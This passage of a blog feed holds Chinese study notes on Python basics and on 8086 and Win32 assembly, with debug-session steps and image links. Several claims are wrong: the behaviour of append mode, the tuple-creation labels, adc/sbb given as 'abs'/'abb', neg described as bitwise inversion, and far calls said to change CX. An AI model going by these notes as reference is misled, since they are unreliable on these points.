title="文件打开方式"></a>文件打开方式</h1><blockquote><p>r+表示以读&#x2F;写方式打开文件，文件必须存在。如果文件不存在，会报错。w+表示以读&#x2F;写方式打开文件，文件若存在则长度清为0，即该文件内容会消失。若不存在则尝试创建。所以r+和w+打开方式并不完全一样。a表示追加写，文件不存在时不会创建新文件</p></blockquote><p>使用read()函数可以指定读出来的多少</p><h1 id="被保护的成员变量可以被直接访问到"><a href="#被保护的成员变量可以被直接访问到" class="headerlink" title="被保护的成员变量可以被直接访问到"></a>被保护的成员变量可以被直接访问到</h1><p>也就是使用<code>_</code>单个下划线的时候我们可以i直接访问该变量</p><h1 id="join的用法"><a href="#join的用法" class="headerlink" title="join的用法"></a>join的用法</h1><p>使用插入的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;，&quot;</span>. join(<span class="hljs-string">&quot;abcde&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="利用切片输出"><a href="#利用切片输出" class="headerlink" title="利用切片输出"></a>利用切片输出</h1><h2 id="偶数下标"><a href="#偶数下标" class="headerlink" title="偶数下标"></a>偶数下标</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[::<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><h2 id="奇数下标"><a href="#奇数下标" class="headerlink" title="奇数下标"></a>奇数下标</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-number">1</span>::<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><h1 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h1><ol><li><p>求交集</p><p><code>&amp;</code></p></li><li><p>求并集</p><p><code>|</code></p></li><li><p>还可以相减</p><p><code>-</code></p></li></ol><h1 id="进制转化"><a href="#进制转化" class="headerlink" title="进制转化"></a>进制转化</h1><ol><li><p>二进制</p><p>bin()</p></li><li><p>八进制</p><p>oct()</p></li><li><p>十六进制</p><p>hex()</p></li></ol><h1 id="当认为是空列表的时候结果是正确的"><a href="#当认为是空列表的时候结果是正确的" class="headerlink" title="当认为是空列表的时候结果是正确的"></a>当认为是空列表的时候结果是正确的</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="创建元组"><a href="#创建元组" class="headerlink" title="创建元组"></a>创建元组</h1><p>注意分清楚下面的几种情况</p><ul><li><p>创建一个”abcd“的元组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tp =<span class="hljs-built_in">tuple</span>([<span class="hljs-string">&quot;abcd&quot;</span>])<br></code></pre></td></tr></table></figure></li><li><p>创建(“abcd”,)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tp =<span class="hljs-built_in">tuple</span>(<span class="hljs-string">&quot;abcd&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>创建一个 (‘a’, ‘b’, ‘c’, ‘d’)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>tp =<span class="hljs-built_in">tuple</span>((<span class="hljs-string">&quot;abcd&quot;</span>))<br></code></pre></td></tr></table></figure></li><li><p>创建非元组’abcd’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tp =(<span class="hljs-string">&quot;abcd&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul><h1 id="格式化输出-1"><a href="#格式化输出-1" class="headerlink" title="格式化输出"></a>格式化输出</h1><ol><li><code>.</code>前面的是总的长度</li><li>后面的是控制精度</li></ol><h1 id="Python动态添加成员"><a href="#Python动态添加成员" class="headerlink" title="Python动态添加成员"></a>Python动态添加成员</h1><p>可以动态的添加呈成员变量</p><p>比如一下的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">pass</span><br><br>t=T()<br>t.ew=<span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(t.ew)<br></code></pre></td></tr></table></figure><h1 id="python一切都是对象"><a href="#python一切都是对象" class="headerlink" title="python一切都是对象"></a>python一切都是对象</h1><p>在Python中，任何数值（包括整数、浮点数、复数等）、字符串、列表、元组、字典等都是对象。在Python中，一切皆对象，这意味着这些数据类型都是对象，它们都具有属性和方法。因此，整数2、字符串’hello’等都是对象。</p><h1 id="readlines"><a href="#readlines" class="headerlink" title="readlines()"></a>readlines()</h1><p>返回的是list类型</p><p>read()返回的是字符串</p><h1 id="描述继承关系"><a href="#描述继承关系" class="headerlink" title="描述继承关系"></a>描述继承关系</h1><p>使用<code>is a</code></p><h1 id="和"><a href="#和" class="headerlink" title="/和//"></a><code>/</code>和<code>//</code></h1><p>使用<code>/</code>的话，是浮点数除法，也就是说，无论使用什么类型结果都是浮点数</p><p><code>//</code>使用这个话，当都是整数的时候会是整形，包括结果是整形的情况下。但是含有浮点数，就是浮点数</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>8086随记</title>
    <link href="/2023/07/19/%E6%B1%87%E7%BC%96/8086%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/07/19/%E6%B1%87%E7%BC%96/8086%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>段地址和偏移地址</p><blockquote><p>段地址是一个16位的值，用于表示内存中的段（Segment）。每个段都有一个唯一的段地址，用于标识该段在内存中的位置。段地址乘以16后，得到段在内存中的起始地址。</p><p>偏移地址是一个16位的值，用于表示相对于段起始地址的偏移量。偏移地址指定了从段起始地址开始的具体位置。</p></blockquote></li><li><p>每个段地址都会相差16个字节</p></li><li><p>汇编代码里面是不区分大小写</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编扫盲</title>
    <link href="/2023/07/16/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%96%E6%89%AB%E7%9B%B2/"/>
    <url>/2023/07/16/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%96%E6%89%AB%E7%9B%B2/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="汇编扫盲"><a href="#汇编扫盲" class="headerlink" title="汇编扫盲"></a>汇编扫盲</h1><h2 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h2><ol><li>用于取指针的地址</li></ol><h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h2><ol><li>用于调用函数，并且提供简单的方式传参数</li></ol><h2 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h2><ol><li><p>去变量的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">invoke MessageBox, 0, offset message, offset title, MB_OK<br></code></pre></td></tr></table></figure></li></ol><h2 id="MASM-gt-addr"><a href="#MASM-gt-addr" class="headerlink" title="MASM-&gt;addr"></a>MASM-&gt;addr</h2><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716103420836.png" alt="image-20230716103420836"></p><h2 id="ASSUME"><a href="#ASSUME" class="headerlink" title="ASSUME"></a><code>ASSUME</code></h2><ol><li><p>ASSUME指令的作用是将一个段寄存器与一个段名进行关联。它告诉汇编器，当遇到使用该段寄存器的指令时，应该将其解释为对应的段名。这样，在编写程序时，我们可以直接使用段寄存器，而不需要显式地指定段名。</p></li><li><p>使用完后记得<code>mothing</code>一下</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717153055004.png" alt="image-20230717153055004"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>8086汇编</title>
    <link href="/2023/07/15/%E6%B1%87%E7%BC%96/8086%E6%B1%87%E7%BC%96/"/>
    <url>/2023/07/15/%E6%B1%87%E7%BC%96/8086%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<p>8086入门学习</p><h1 id="8086汇编代码"><a href="#8086汇编代码" class="headerlink" title="8086汇编代码"></a>8086汇编代码</h1><h2 id="使用debug"><a href="#使用debug" class="headerlink" title="使用debug"></a>使用debug</h2><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230719181638022.png" alt="image-20230719181638022"></p><ol><li><p>在终端中输入<code>debug</code>进入到调式界面</p></li><li><p>查看寄存器输入<code>R</code></p><ul><li><code>r+寄存器变量名</code>直接修改寄存器的值</li></ul></li><li><p>查看内存输入<code>D</code> </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230719182834156.png" alt="image-20230719182834156"></p><ul><li><p>也可以添加地址，从1000段地址偏移0开始输出 </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230719182309364.png" alt="image-20230719182309364"></p></li></ul></li><li><p>改变内存的内容<code>E</code></p><ul><li><p>第一种方法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230719182659159.png" alt="image-20230719182659159"></p></li><li><p>第二种方法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230719183431008.png" alt="image-20230719183431008"></p></li></ul></li><li><p>使用<code>A</code>添加汇编代码</p></li><li><p><code>T</code>执行插入的指令</p></li><li><p><code>U</code>翻译机器码</p></li></ol><h2 id="部分寄存器"><a href="#部分寄存器" class="headerlink" title="部分寄存器"></a>部分寄存器</h2><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722085403982.png" alt="image-20230722085403982"></p><h2 id="指令的学习"><a href="#指令的学习" class="headerlink" title="指令的学习"></a>指令的学习</h2><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a><code>mov</code></h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720151104219.png" alt="image-20230720151104219"></p><ol><li><p>注意逗号后面的控制</p></li><li><p>下面操作寄存器的高位和低位</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720151249768.png" alt="image-20230720151249768"></p><p>注意第三条指令(不包括错误的指令)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ch, 10<br></code></pre></td></tr></table></figure><p>这段代码表示将10给c寄存器的高位（hight）</p><p>由此可以知道直接使用<code>mov</code>直接赋值给低地址位</p></li></ol><h3 id="add"><a href="#add" class="headerlink" title="add"></a><code>add</code></h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720152313629.png" alt="image-20230720152313629"></p><ol><li><p>将两个数相加</p></li><li><p>同时也可以实现自己加自己</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720152634451.png" alt="image-20230720152634451"></p></li><li><p>相加如果越位了就直接舍去</p></li><li><p>如使用地位相加过后溢位了</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720153048935.png" alt="image-20230720153048935"></p><p>同样的不会进位</p><p>但是使用的是整个的寄存器那么就会进位</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230720153203861.png" alt="image-20230720153203861"></p></li></ol><h3 id="sub"><a href="#sub" class="headerlink" title="sub"></a><code>sub</code></h3><ol><li><p>sub会向下越界</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722083756095.png" alt="image-20230722083756095"></p></li><li><p>同样的如果是操作低位或高位，只会在低位或者高位进行sub计算</p></li></ol><h3 id="mul"><a href="#mul" class="headerlink" title="mul"></a><code>mul</code></h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722085536634.png" alt="image-20230722085536634"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722085647601.png" alt="image-20230722085647601"></p><ol><li><p>首先应该知道</p><p>乘数一个是放<code>ax</code>或者<code>al</code>当中的，另一个是自己指定的</p></li><li><p>存放的时候默认放在<code>ax</code>，如果是16位的乘法，高位就放在<code>dx</code></p></li></ol><p><code>div</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722090833052.png" alt="image-20230722090833052"></p><ol><li><p>除数相当于是我们指定的</p><p>被除数要分情况，被除数是16位放在<code>ax</code>当中；是<code>32</code>就放在<code>dx</code>和<code>ax</code>当中，高位放在<code>dx</code>地位放在<code>ax</code></p></li><li><p>结果的从存放。</p><p>高位放余数，低位放置商</p></li></ol><p><code>and</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722091746751.png" alt="image-20230722091746751"></p><ol><li><p>有<code>0</code>就是<code>0</code></p></li><li><p>下面演示操作方法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722092236392.png" alt="image-20230722092236392"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722092457283.png" alt="image-20230722092457283"></p></li></ol><p><code>or</code></p><ol><li>有<code>1</code>就是<code>1</code></li><li>但是在<code>debug</code>界面我们不能使用二进制，所以先要转换成16进制才能计算二进制</li></ol><h3 id="左右移的指令"><a href="#左右移的指令" class="headerlink" title="左右移的指令"></a><code>左右移的指令</code></h3><ol><li>移动都是移动的是二进制</li></ol><h4 id="shl左移"><a href="#shl左移" class="headerlink" title="shl左移"></a><code>shl</code>左移</h4><ol><li><p>和C语言的一致，向左移动，然后右边补<code>0</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722093511339.png" alt="image-20230722093511339"></p></li></ol><h4 id="rol循环左移"><a href="#rol循环左移" class="headerlink" title="rol循环左移"></a><code>rol</code>循环左移</h4><ol><li>将高位舍去的位数补充到低位</li></ol><h4 id="shr右移"><a href="#shr右移" class="headerlink" title="shr右移"></a><code>shr</code>右移</h4><h4 id="ror循环右移"><a href="#ror循环右移" class="headerlink" title="ror循环右移"></a><code>ror</code>循环右移</h4><h3 id="inc自增操作"><a href="#inc自增操作" class="headerlink" title="inc自增操作"></a><code>inc</code>自增操作</h3><h3 id="dec自减操作"><a href="#dec自减操作" class="headerlink" title="dec自减操作"></a><code>dec</code>自减操作</h3><h3 id="nop空的代码段"><a href="#nop空的代码段" class="headerlink" title="nop空的代码段"></a><code>nop</code>空的代码段</h3><ol><li>大小为一个字节</li><li>可以用存放代码段</li></ol><h3 id="xchg交换"><a href="#xchg交换" class="headerlink" title="xchg交换"></a><code>xchg</code>交换</h3><ol><li>可以用于交换两个数，寄存器或者地址</li></ol><h3 id="neg取反"><a href="#neg取反" class="headerlink" title="neg取反"></a><code>neg</code>取反</h3><ol><li>用于将二进制取反操作</li></ol><h3 id="abs带进位的加法"><a href="#abs带进位的加法" class="headerlink" title="abs带进位的加法"></a><code>abs</code>带进位的加法</h3><ol><li>利用的是cf寄存器</li></ol><h3 id="abb带借位的一个减法"><a href="#abb带借位的一个减法" class="headerlink" title="abb带借位的一个减法"></a><code>abb</code>带借位的一个减法</h3><ol><li>使用的也是cf寄存器</li></ol><h3 id="cmp是比较，也是减法"><a href="#cmp是比较，也是减法" class="headerlink" title="cmp是比较，也是减法"></a><code>cmp</code>是比较，也是减法</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722170544073.png" alt="image-20230722170544073"></p><p>通过相减看是否是相等的</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722171803628.png" alt="image-20230722171803628"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722172100724.png" alt="image-20230722172100724"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722172133543.png" alt="image-20230722172133543"></p><h3 id="call和ret"><a href="#call和ret" class="headerlink" title="call和ret"></a><code>call</code>和<code>ret</code></h3><ol><li><p>通过修改cx的值进行跳转</p></li><li><p><code>call</code>相当于函数的调用</p></li><li><p><code>ret</code>用于函数的结束</p></li><li><p>但是整体的结束是INT 21H</p></li><li><p>CALL 和  RET的都是修改IP的值，也就是说是近转移</p></li><li><p>CALLF和RETF就是说是远转移，如果通过修改IP不能达到要求，则会修改 CX</p></li><li><p>本质都是压栈和弹栈的过程</p><p>CALL是压栈，将代码的地址压栈</p><p>RET是出栈，将代码的地址</p></li></ol><h3 id="offset读取一个函数的地址，然后赋值"><a href="#offset读取一个函数的地址，然后赋值" class="headerlink" title="offset读取一个函数的地址，然后赋值"></a>offset读取一个函数的地址，然后赋值</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230723123016835.png" alt="image-20230723123016835"></p><ol><li>获取一个函数的地址，然后进行操作</li></ol><h3 id="lea"><a href="#lea" class="headerlink" title="lea"></a><code>lea</code></h3><ol><li>计算有效地址：<code>lea</code> 可以计算一个内存操作数的有效地址，并将结果（即内存地址）加载到目标寄存器中。例如，<code>lea eax, [ebx+ecx*4]</code> 将计算 <code>[ebx+ecx*4]</code> 的有效地址，并将结果存储到寄存器 <code>eax</code> 中。</li><li>进行简单的加法运算：<code>lea</code> 可以执行简单的加法运算，并将结果加载到目标寄存器中。例如，<code>lea eax, [ebx+123]</code> 将 <code>ebx+123</code> 的结果计算出来，并将结果存储到寄存器 <code>eax</code> 中。</li></ol><h2 id="终断"><a href="#终断" class="headerlink" title="终断"></a>终断</h2><ol><li>程序停止就是中断</li></ol><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="段地址和偏移地址"><a href="#段地址和偏移地址" class="headerlink" title="段地址和偏移地址"></a>段地址和偏移地址</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722100913434.png" alt="image-20230722100913434"></p><ol><li><p>一个物理地址可以有很多个段地址加偏移地址的组合 </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722101449853.png" alt="image-20230722101449853"></p></li><li><p>下面演示使用DS（数据段地址）+偏移地址给ax赋值</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722102553160.png" alt="image-20230722102553160"></p><p>注意标红的地方就是使用的偏移地址</p></li><li><p>不通过<code>r</code>修改DS寄存器</p><p>由于DOS的限制，不能直接使用MOV修改DS寄存器</p><p>但是可以使用下面的例子对DS赋值</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722103018201.png" alt="image-20230722103018201"></p><p>我们先将值赋给AX然后在对其赋值</p></li></ol><h3 id="CS和IP-代码段寄存器"><a href="#CS和IP-代码段寄存器" class="headerlink" title="CS和IP   代码段寄存器"></a>CS和IP   代码段寄存器</h3><p>代码运行地址</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722104944573.png" alt="image-20230722104944573"></p><ol><li><p>物理的内存等于</p><p>​CS*16+IP&#x3D;内存</p></li><li><p>下面使用实例</p><ul><li><p>先将规定地址，在添加汇编代码</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722105649871.png" alt="image-20230722105649871"></p></li><li><p>使用U将机器码翻译成汇编代码</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722105723077.png" alt="image-20230722105723077"></p></li></ul></li><li><p>注意</p><p><strong>如果要指定一段地址运行，需要修改CS和IP的数值</strong></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722114949873.png" alt="image-20230722114949873"></p></li></ol><h3 id="jump指令"><a href="#jump指令" class="headerlink" title="jump指令"></a><code>jump</code>指令</h3><ol><li><p>用于不同内存的跳转</p><p>下面的实现在1E2B:0100运行mov ax,8989</p><p>然后使用jump与运行jump1000:0000</p><p>运行move bx,1212</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722125003980.png" alt="image-20230722125003980"></p><p>注意在编写的时候我们需要手动跳转内存进行写代码</p></li></ol><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><ol><li><p>先进后出，后进先出</p></li><li><p>压栈</p><blockquote><p>将ax,bx,cx压入栈</p></blockquote><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722130358149.png" alt="image-20230722130358149"></p></li><li><p>出栈</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722130541365.png" alt="image-20230722130541365"></p></li><li><p>寻址的实现</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722131010719.png" alt="image-20230722131010719"></p><p>我们通过记录段地址用SS，使用SP记录偏移的地址</p></li><li><p>栈的越界</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722131701530.png" alt="image-20230722131701530"></p><p>也就是说，计算机不会检测，需要人为的注意栈区的大小</p></li></ol><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ol><li>使用偏移地址的方式<ul><li>首先使用CS进行段地址的赋值</li><li>然后使用偏移地址的方式查找</li><li>注意BX寄存器也是可以用来当作偏移地址</li></ul></li></ol><h3 id="SI和DI"><a href="#SI和DI" class="headerlink" title="SI和DI"></a><code>SI</code>和<code>DI</code></h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722155845770.png" alt="image-20230722155845770"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722160118625.png" alt="image-20230722160118625"></p><h3 id="BX-寄存器BX的替代品"><a href="#BX-寄存器BX的替代品" class="headerlink" title="BX 寄存器BX的替代品"></a>BX 寄存器BX的替代品</h3><ol><li>代表了以SS:BP</li><li>可以用于寻址</li><li>同时还可以使用<code>.</code>表示偏移地址</li></ol><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722161253506.png" alt="image-20230722161253506"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722161405353.png" alt="image-20230722161405353"></p><h3 id="ES附加段寄存器"><a href="#ES附加段寄存器" class="headerlink" title="ES附加段寄存器"></a><code>ES</code>附加段寄存器</h3><p>相当于备胎，和其他的差不多</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722161635034.png" alt="image-20230722161635034"></p><h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><h2 id="比较器，相当于c-的if"><a href="#比较器，相当于c-的if" class="headerlink" title="比较器，相当于c++的if"></a>比较器，相当于c++的if</h2><h2 id="段"><a href="#段" class="headerlink" title="段"></a>段</h2><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230722172758881.png" alt="image-20230722172758881" style="zoom:150%;" /><ol><li><p>注意我们需要先将cs指定，也就是code segment</p><p>还需要将codesg ends 结尾</p></li></ol><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><ol><li>使用loop进行循环</li><li>根据CX的值是否为0，进行判断是否是可行的</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>win32汇编</title>
    <link href="/2023/07/15/%E6%B1%87%E7%BC%96/win32%E6%B1%87%E7%BC%96/"/>
    <url>/2023/07/15/%E6%B1%87%E7%BC%96/win32%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="win32汇编"><a href="#win32汇编" class="headerlink" title="win32汇编"></a>win32汇编</h1><h2 id="模式定义"><a href="#模式定义" class="headerlink" title="模式定义"></a>模式定义</h2><ol><li><p>定义了程序使用的指令集、互作模式和格式</p></li><li><p>win32环境中<code>.386</code>是必不可少的</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715173340028.png" alt="image-20230715173340028"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715173449273.png" alt="image-20230715173449273"></p></li><li><p>后面带<code>p</code>则是伪指令</p></li><li><p>内存模式</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715173747893.png" alt="image-20230715173747893"></p><p>但是主要使用的是<code>flat</code></p><blockquote><p>因win32程序只有一种内存模式，flat模式，没有64kb的限制</p></blockquote></li><li><p>语言模式</p><p>除了在<code>.model</code>语句中指定内存模式意以外，还应该指定语言模式</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715174527757.png" alt="image-20230715174527757"></p><ul><li>stdcall的参数压栈方式是：从右往左</li></ul></li><li><p><code>option</code>语句</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715175305850.png" alt="image-20230715175305850"></p></li></ol><h2 id="短的定义"><a href="#短的定义" class="headerlink" title="短的定义"></a>短的定义</h2><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715180311206.png" alt="image-20230715180311206"></p><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715194544213.png" alt="image-20230715194544213"></p><ol><li><p>可读可写的已定义的变量</p><p>这些数据在<code>.data</code>的段中，是已初始化的数据段。<code>.data</code>的段存放在可执行文件的_DATA字节区内</p></li><li><p>可读可写的未定义的变量</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715195000045.png" alt="image-20230715195000045"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715195240031.png" alt="image-20230715195240031"></p></li><li><p>常量</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715195356997.png" alt="image-20230715195356997"></p></li></ol><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><ol><li>所有的指令都在代码段里面</li><li>代码段是放在_TEXT的节区中的</li></ol><h2 id="简单知识点"><a href="#简单知识点" class="headerlink" title="简单知识点"></a>简单知识点</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ol><li><p>在代码前面写”;”，代表注释处理 </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715201548889.png" alt="image-20230715201548889"></p></li></ol><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><ol><li>由于程序的某一行过长，不利于阅读时可以使用<code>\</code>做换行符</li></ol><h3 id="调用API函数"><a href="#调用API函数" class="headerlink" title="调用API函数"></a>调用API函数</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715201811427.png" alt="image-20230715201811427"></p><p> <img 